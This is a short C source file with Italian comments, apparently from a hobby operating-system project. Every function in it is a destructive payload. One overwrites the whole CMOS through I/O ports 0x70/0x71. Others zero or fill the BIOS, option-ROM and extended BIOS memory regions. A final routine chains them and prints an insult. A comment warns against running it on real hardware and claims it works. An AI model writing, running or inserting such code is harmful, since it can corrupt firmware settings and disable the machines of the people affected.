void CMOS_INCULOS() { // la semplifico. Allora, prende il cmos e ci scrive sopra. NON FATELO SU REAL HARDWARE {posso dimostrare che funziona.} GRAZIE
    uint8_t buffer[0x400];

    for (int i = 0; i < 0x400; ++i) {
        buffer[i] = i & 0xFF;
    }

    for (int i = 0x10; i < 0x400; ++i) {
        buffer[i] = 0xFF;
    }

    outb(0x70, 0x76);
    outb(0x71, 0x12);

    for (uint16_t i = 0; i < 0x100; ++i) {
        outb(0x70, (uint8_t)i);
        outb(0x71, buffer[i]);
    }

}

void KILL_BIOS() {
    uint8_t* bios = (uint8_t*)0xF0000;
    for(int i = 0; i < 65536; i++) {
        bios[i] = 0x00;
    }

}
void KB2() {
    uint8_t* bios_areas[] = {
        (uint8_t*)0xE0000,  
        (uint8_t*)0xF0000,  
        (uint8_t*)0xC0000, 
    };
    
    for(int area = 0; area < 3; area++) {
        for(int i = 0; i < 65536; i++) {
            bios_areas[area][i] = 0xCC; 
        }
    }
}
//NUOVI = KILL_BIOS + KB2
void CMDS() {
    KB2();
    KILL_BIOS();
    CMOS_INCULOS();
    draw_text(10, 105, "Fuck you", 0x04, 0x00);

}

